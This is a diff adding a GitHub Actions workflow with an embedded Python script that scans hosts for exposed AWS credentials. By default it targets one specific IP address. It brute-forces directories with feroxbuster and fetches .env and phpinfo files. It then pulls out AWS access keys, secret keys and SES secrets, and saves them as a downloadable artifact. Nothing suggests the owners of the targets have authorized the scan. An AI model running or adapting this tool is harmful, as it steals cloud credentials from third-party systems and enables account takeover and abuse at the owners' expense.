@@ -1,0 +1,192 @@
+name: AWS Key Scanner
+
+on:
+  workflow_dispatch:
+    inputs:
+      targets:
+        description: "Liste des IP/domaines (séparés par des virgules)"
+        required: true
+        default: "98.92.70.139"
+      wordlist_url:
+        description: "URL de la wordlist"
+        required: false
+        default: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: "3.10"
+      
+      - name: Install feroxbuster
+        run: |
+          wget https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.tar.gz
+          tar -xzf x86_64-linux-feroxbuster.tar.gz
+          chmod +x feroxbuster
+          sudo mv feroxbuster /usr/local/bin/
+      
+      - name: Download wordlist
+        run: |
+          wget -O wordlist.txt "${{ github.event.inputs.wordlist_url }}"
+      
+      - name: Create scanner script
+        run: |
+          cat > scanner.py << 'EOF'
+import json
+import subprocess
+import urllib.request
+import urllib.error
+import ssl
+import os
+import re
+import sys
+
+ssl_ctx = ssl._create_unverified_context()
+aws_access_key_regex = re.compile(r'AKIA[A0-Z9]{16}')
+secret_or_ses_regex = re.compile(r'[\\w+/=]{40,44}')
+
+def extract_keys_from_env(content):
+    lines = content.splitlines()
+    results = []
+    for idx, line in enumerate(lines):
+        if aws_access_key_regex.search(line):
+            start = max(0, idx - 3)
+            end = min(len(lines), idx + 4)
+            context_lines = lines[start:end]
+            access_key = aws_access_key_regex.search(line).group() if aws_access_key_regex.search(line) else None
+            secret_key = None
+            ses_secret = None
+            for context_line in context_lines:
+                if '=' in context_line:
+                    _, value = context_line.split('=', 1)
+                    value = value.strip()
+                    if len(value) == 40:
+                        secret_key = value
+                    elif len(value) == 44:
+                        ses_secret = value
+            results.append({"access_key": access_key, "secret_key": secret_key, "ses_secret": ses_secret})
+    return results
+
+def extract_keys_from_info_php(content):
+    lines = content.splitlines()
+    results = []
+    for idx, line in enumerate(lines):
+        if aws_access_key_regex.search(line):
+            m = aws_access_key_regex.search(line)
+            access_key = m.group() if m else None
+            start = max(0, idx - 3)
+            end = min(len(lines), idx + 4)
+            context_lines = lines[start:end]
+            secret_key = None
+            ses_secret = None
+            for ctx in context_lines:
+                for cand in secret_or_ses_regex.findall(ctx):
+                    if len(cand) == 40 and secret_key is None:
+                        secret_key = cand
+                    elif len(cand) == 44 and ses_secret is None:
+                        ses_secret = cand
+            results.append({"access_key": access_key, "secret_key": secret_key, "ses_secret": ses_secret})
+    return results
+
+def scan_target(target, wordlist):
+    target = "http://" + target
+    cmd = ["feroxbuster", "-u", target, "-w", wordlist, "--silent"]
+    print(f"Running: {' '.join(cmd)}")
+    
+    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    stdout_data, stderr_data = proc.communicate()
+    
+    if proc.returncode != 0:
+        print(f"feroxbuster failed: {stderr_data}")
+        return []
+    
+    dirs = []
+    for line in stdout_data.splitlines():
+        line = line.strip()
+        if line:
+            parts = line.split()
+            url = parts[-1]
+            dirs.append(url)
+    
+    return dirs
+
+def check_endpoints(dirs):
+    findings = []
+    for dir_url in dirs:
+        # Check .env
+        env_url = dir_url.rstrip("/") + "/.env"
+        print(f"Checking: {env_url}")
+        try:
+            req = urllib.request.Request(env_url, method="GET")
+            with urllib.request.urlopen(req, context=ssl_ctx, timeout=15) as resp:
+                if resp.getcode() == 200:
+                    content = resp.read().decode(errors='ignore')
+                    if aws_access_key_regex.search(content):
+                        found_keys = extract_keys_from_env(content)
+                        findings.append({"url": env_url, "type": ".env", "keys": found_keys})
+        except Exception as e:
+            pass
+        
+        # Check info.php / phpinfo.php
+        for info_name in ["info.php", "phpinfo.php"]:
+            info_url = dir_url.rstrip("/") + "/" + info_name
+            print(f"Checking: {info_url}")
+            try:
+                req_info = urllib.request.Request(info_url, method="GET")
+                with urllib.request.urlopen(req_info, context=ssl_ctx, timeout=15) as resp:
+                    if resp.getcode() == 200:
+                        info_content = resp.read().decode(errors='ignore')
+                        if aws_access_key_regex.search(info_content):
+                            found_keys_info = extract_keys_from_info_php(info_content)
+                            findings.append({"url": info_url, "type": info_name, "keys": found_keys_info})
+            except Exception as e:
+                pass
+    
+    return findings
+
+if __name__ == "__main__":
+    targets = sys.argv[1].split(",")
+    wordlist = sys.argv[2]
+    
+    all_findings = []
+    for target in targets:
+        target = target.strip()
+        print(f"\\n=== Scanning {target} ===")
+        dirs = scan_target(target, wordlist)
+        print(f"Found {len(dirs)} directories")
+        findings = check_endpoints(dirs)
+        all_findings.extend(findings)
+    
+    print(f"\\n=== Results ===")
+    print(json.dumps(all_findings, indent=2))
+    
+    with open("results.json", "w") as f:
+        json.dump(all_findings, f, indent=2)
+EOF
+      
+      - name: Run scanner
+        run: |
+          python scanner.py "${{ github.event.inputs.targets }}" wordlist.txt
+      
+      - name: Upload results
+        uses: actions/upload-artifact@v3
+        if: always()
+        with:
+          name: scan-results
+          path: results.json
+      
+      - name: Display results
+        if: always()
+        run: |
+          if [ -f results.json ]; then
+            echo "=== Scan Results ==="
+            cat results.json
+          fi
+
